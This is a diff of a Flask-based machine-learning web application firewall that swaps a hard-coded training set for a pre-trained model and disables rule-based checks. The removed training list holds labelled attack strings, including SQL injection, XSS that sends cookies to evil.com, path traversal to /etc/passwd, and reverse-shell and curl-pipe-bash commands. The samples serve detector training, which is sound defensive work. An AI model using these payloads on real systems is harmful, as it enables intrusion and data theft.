@@ -7,6 +7,8 @@ import re
 import numpy as np
 from flask import Flask, request, jsonify
 from flask_cors import CORS
+import pickle
+import joblib
 
 # ML imports
 from sklearn.feature_extraction.text import TfidfVectorizer
@@ -16,115 +18,182 @@ from sklearn.preprocessing import LabelEncoder
 app = Flask(__name__)
 CORS(app)
 
+
+
+
+# Login using e.g. `huggingface-cli login` to access this dataset
+
 # ============ ML MODEL TRAINING DATA ============
 # Sample training data for the ML model
-TRAINING_DATA = [
-    # SQL Injection samples
-    ("' OR 1=1 --", "SQL_INJECTION"),
-    ("'; DROP TABLE users; --", "SQL_INJECTION"),
-    ("1' AND '1'='1", "SQL_INJECTION"),
-    ("admin'--", "SQL_INJECTION"),
-    ("' UNION SELECT * FROM users --", "SQL_INJECTION"),
-    ("1; SELECT * FROM information_schema.tables", "SQL_INJECTION"),
-    ("' OR 'x'='x", "SQL_INJECTION"),
-    ("1' OR '1'='1' /*", "SQL_INJECTION"),
-    ("'; EXEC xp_cmdshell('dir'); --", "SQL_INJECTION"),
-    ("1 AND 1=1 UNION SELECT null, username, password FROM users", "SQL_INJECTION"),
+# TRAINING_DATA = [
+#     # SQL Injection samples
+#     ("' OR 1=1 --", "SQL_INJECTION"),
+#     ("'; DROP TABLE users; --", "SQL_INJECTION"),
+#     ("1' AND '1'='1", "SQL_INJECTION"),
+#     ("admin'--", "SQL_INJECTION"),
+#     ("' UNION SELECT * FROM users --", "SQL_INJECTION"),
+#     ("1; SELECT * FROM information_schema.tables", "SQL_INJECTION"),
+#     ("' OR 'x'='x", "SQL_INJECTION"),
+#     ("1' OR '1'='1' /*", "SQL_INJECTION"),
+#     ("'; EXEC xp_cmdshell('dir'); --", "SQL_INJECTION"),
+#     ("1 AND 1=1 UNION SELECT null, username, password FROM users", "SQL_INJECTION"),
     
-    # XSS samples
-    ("<script>alert('XSS')</script>", "XSS"),
-    ("<img src=x onerror=alert(1)>", "XSS"),
-    ("javascript:alert(document.cookie)", "XSS"),
-    ("<svg onload=alert(1)>", "XSS"),
-    ("<body onload=alert('XSS')>", "XSS"),
-    ("<iframe src='javascript:alert(1)'>", "XSS"),
-    ("'\"><script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
-    ("<input onfocus=alert(1) autofocus>", "XSS"),
-    ("document.location='http://evil.com?c='+document.cookie", "XSS"),
-    ("<div style=\"background:url(javascript:alert('XSS'))\">", "XSS"),
+#     # XSS samples
+#     ("<script>alert('XSS')</script>", "XSS"),
+#     ("<img src=x onerror=alert(1)>", "XSS"),
+#     ("javascript:alert(document.cookie)", "XSS"),
+#     ("<svg onload=alert(1)>", "XSS"),
+#     ("<body onload=alert('XSS')>", "XSS"),
+#     ("<iframe src='javascript:alert(1)'>", "XSS"),
+#     ("'\"><script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
+#     ("<input onfocus=alert(1) autofocus>", "XSS"),
+#     ("document.location='http://evil.com?c='+document.cookie", "XSS"),
+#     ("<div style=\"background:url(javascript:alert('XSS'))\">", "XSS"),
     
-    # Path Traversal samples
-    ("../../../etc/passwd", "PATH_TRAVERSAL"),
-    ("....//....//etc/passwd", "PATH_TRAVERSAL"),
-    ("%2e%2e%2f%2e%2e%2fetc/passwd", "PATH_TRAVERSAL"),
-    ("..\\..\\..\\windows\\system32\\config\\sam", "PATH_TRAVERSAL"),
-    ("/var/www/../../etc/shadow", "PATH_TRAVERSAL"),
-    ("file:///etc/passwd", "PATH_TRAVERSAL"),
-    ("....//....//....//etc/passwd", "PATH_TRAVERSAL"),
-    ("%252e%252e%252fetc/passwd", "PATH_TRAVERSAL"),
+#     # Path Traversal samples
+#     ("../../../etc/passwd", "PATH_TRAVERSAL"),
+#     ("....//....//etc/passwd", "PATH_TRAVERSAL"),
+#     ("%2e%2e%2f%2e%2e%2fetc/passwd", "PATH_TRAVERSAL"),
+#     ("..\\..\\..\\windows\\system32\\config\\sam", "PATH_TRAVERSAL"),
+#     ("/var/www/../../etc/shadow", "PATH_TRAVERSAL"),
+#     ("file:///etc/passwd", "PATH_TRAVERSAL"),
+#     ("....//....//....//etc/passwd", "PATH_TRAVERSAL"),
+#     ("%252e%252e%252fetc/passwd", "PATH_TRAVERSAL"),
     
-    # Command Injection samples
-    ("; ls -la", "COMMAND_INJECTION"),
-    ("| cat /etc/passwd", "COMMAND_INJECTION"),
-    ("`whoami`", "COMMAND_INJECTION"),
-    ("$(cat /etc/passwd)", "COMMAND_INJECTION"),
-    ("; rm -rf /", "COMMAND_INJECTION"),
-    ("&& wget http://evil.com/shell.sh", "COMMAND_INJECTION"),
-    ("| nc -e /bin/sh 10.0.0.1 4444", "COMMAND_INJECTION"),
-    ("; curl http://evil.com/malware | bash", "COMMAND_INJECTION"),
+#     # Command Injection samples
+#     ("; ls -la", "COMMAND_INJECTION"),
+#     ("| cat /etc/passwd", "COMMAND_INJECTION"),
+#     ("`whoami`", "COMMAND_INJECTION"),
+#     ("$(cat /etc/passwd)", "COMMAND_INJECTION"),
+#     ("; rm -rf /", "COMMAND_INJECTION"),
+#     ("&& wget http://evil.com/shell.sh", "COMMAND_INJECTION"),
+#     ("| nc -e /bin/sh 10.0.0.1 4444", "COMMAND_INJECTION"),
+#     ("; curl http://evil.com/malware | bash", "COMMAND_INJECTION"),
     
-    # Safe/Normal samples
-    ("Hello World", "SAFE"),
-    ("Search for products", "SAFE"),
-    ("user@example.com", "SAFE"),
-    ("Contact us for more information", "SAFE"),
-    ("Add item to cart", "SAFE"),
-    ("View order history", "SAFE"),
-    ("Update profile settings", "SAFE"),
-    ("Download invoice PDF", "SAFE"),
-    ("GET /api/users/123", "SAFE"),
-    ("POST /api/orders", "SAFE"),
-    ("username=john&password=secret123", "SAFE"),
-    ("filter=price&sort=asc", "SAFE"),
-]
+#     # Safe/Normal samples
+#     ("Hello World", "SAFE"),
+#     ("Search for products", "SAFE"),
+#     ("user@example.com", "SAFE"),
+#     ("Contact us for more information", "SAFE"),
+#     ("Add item to cart", "SAFE"),
+#     ("View order history", "SAFE"),
+#     ("Update profile settings", "SAFE"),
+#     ("Download invoice PDF", "SAFE"),
+#     ("GET /api/users/123", "SAFE"),
+#     ("POST /api/orders", "SAFE"),
+#     ("username=john&password=secret123", "SAFE"),
+#     ("filter=price&sort=asc", "SAFE"),
+# ]
 
-# Initialize ML model
-print("[*] Training ML model...")
-texts = [t[0] for t in TRAINING_DATA]
-labels = [t[1] for t in TRAINING_DATA]
+
+# NEW_DATA_SET = pd.read_csv("payload_full.csv")
+
+# dataset = NEW_DATA_SET[""]
+
+# # Initialize ML model
+# print("[*] Training ML model...")
+# texts = [t[0] for t in TRAINING_DATA]
+# labels = [t[1] for t in TRAINING_DATA]
 
 # Feature extraction
-vectorizer = TfidfVectorizer(
-    analyzer='char',
-    ngram_range=(2, 5),
-    max_features=1000
-)
-X = vectorizer.fit_transform(texts)
+# vectorizer = TfidfVectorizer(
+#     analyzer='char',
+#     ngram_range=(2, 5),
+#     max_features=1000
+# )
+# X = vectorizer.fit_transform(texts)
 
-# Label encoding
-label_encoder = LabelEncoder()
-y = label_encoder.fit_transform(labels)
+# # Label encoding
+# label_encoder = LabelEncoder()
+# y = label_encoder.fit_transform(labels)
 
-# Train model
-ml_model = LogisticRegression(max_iter=1000)
-ml_model.fit(X, y)
-print("[OK] ML model trained successfully!")
+# # Train model
+# ml_model = LogisticRegression(max_iter=1000)
+# ml_model.fit(X, y)
+# print("[OK] ML model trained successfully!")
+def extract_special_features(texts):
+    import numpy as np
+    import re
 
+    features = []
 
+    for text in texts:
+        if not isinstance(text, str):
+            text = str(text)
+
+        text_lower = text.lower()
+
+        features.append([
+            int('../' in text or '..\\' in text),
+            int('%' in text),
+            int(text.count('/') > 3),
+            int(re.search(r'etc/passwd|windows\\win', text_lower) is not None),
+            len(re.findall(r'%[0-9a-f]{2}', text_lower)),
+            text.count('.'),
+            int(';' in text or '|' in text or '&' in text),
+            int('=' in text and '../' in text),
+        ])
+
+    return np.array(features)
+
+#Load pre-trained model
+preTrainedModel = joblib.load('waf_ai_engine.pkl')
+print("Model loaded successfully")
+
+#Load label encoding
+label_encoder = joblib.load('label_encoder.pkl')
+print("Label encoder loaded successfully")
+#new function
 def predict_threat(request_text: str) -> tuple:
     """
-    Use ML model to predict threat type and confidence.
-    Returns: (predicted_type, confidence_score)
+    Predict attack type using the trained pipeline.
+    Returns: (label, confidence)
     """
+
     if not request_text or len(request_text.strip()) == 0:
         return "SAFE", 0.1
-    
+
     try:
-        # Transform input text
-        X_new = vectorizer.transform([request_text])
-        
-        # Get prediction probabilities
-        probs = ml_model.predict_proba(X_new)[0]
-        predicted_class = np.argmax(probs)
-        confidence = float(probs[predicted_class])
-        
+        # Predict class index
+        pred_class = preTrainedModel.predict([request_text])[0]
+
+        # Predict probabilities
+        probs = preTrainedModel.predict_proba([request_text])[0]
+        confidence = float(np.max(probs))
+
         # Decode label
-        predicted_label = label_encoder.inverse_transform([predicted_class])[0]
-        
+        predicted_label = label_encoder.inverse_transform([pred_class])[0]
+
         return predicted_label, confidence
+
     except Exception as e:
         app.logger.error(f"ML prediction error: {e}")
         return "SAFE", 0.1
+#old function
+# def predict_threat(request_text: str) -> tuple:
+#     """
+#     Use ML model to predict threat type and confidence.
+#     Returns: (predicted_type, confidence_score)
+#     """
+#     if not request_text or len(request_text.strip()) == 0:
+#         return "SAFE", 0.1
+    
+#     try:
+#         # Transform input text
+#         X_new = vectorizer.transform([request_text])
+        
+#         # Get prediction probabilities
+#         probs = preTrainedModel.predict_proba(X_new)[0]
+#         predicted_class = np.argmax(probs)
+#         confidence = float(probs[predicted_class])
+        
+#         # Decode label
+#         predicted_label = label_encoder.inverse_transform([predicted_class])[0]
+        
+#         return predicted_label, confidence
+#     except Exception as e:
+#         app.logger.error(f"ML prediction error: {e}")
+#         return "SAFE", 0.1
 
 
 # ============ RULE-BASED DETECTION PATTERNS ============
@@ -207,24 +276,26 @@ def detect_attack_type(payload: str) -> tuple:
     Returns: (is_malicious, attack_type, confidence)
     """
     # Get rule-based result
-    rule_detected, rule_type, rule_conf = rule_based_detect(payload)
+    # rule_detected, rule_type, rule_conf = rule_based_detect(payload)
     
     # Get ML result
     ml_type, ml_conf = predict_threat(payload)
     
     # Combine results with weighted scoring
-    if rule_detected:
-        # Boost confidence if both methods agree
-        if rule_type == ml_type:
-            combined_conf = min(0.99, (rule_conf * 0.6 + ml_conf * 0.4) + 0.05)
-        else:
-            combined_conf = rule_conf
-        return True, rule_type, round(combined_conf, 2)
+    # if rule_detected:
+    #     # Boost confidence if both methods agree
+    #     if rule_type == ml_type:
+    #         combined_conf = min(0.99, (rule_conf * 0.6 + ml_conf * 0.4) + 0.05)
+    #     else:
+    #         combined_conf = rule_conf
+    #     return True, rule_type, round(combined_conf, 2)
     
-    # If rule-based didn't detect but ML has high confidence
-    if ml_type != "SAFE" and ml_conf > 0.7:
+    # # If rule-based didn't detect but ML has high confidence
+    # if ml_type != "norm" and ml_conf > 0.7:
+    #     return True, ml_type, round(ml_conf * 0.85, 2)
+    
+    if ml_type != "norm" and ml_conf > 0.6:
         return True, ml_type, round(ml_conf * 0.85, 2)
-    
     # No threat detected
     return False, "SAFE", round(max(1 - ml_conf, 0.05), 2)
 
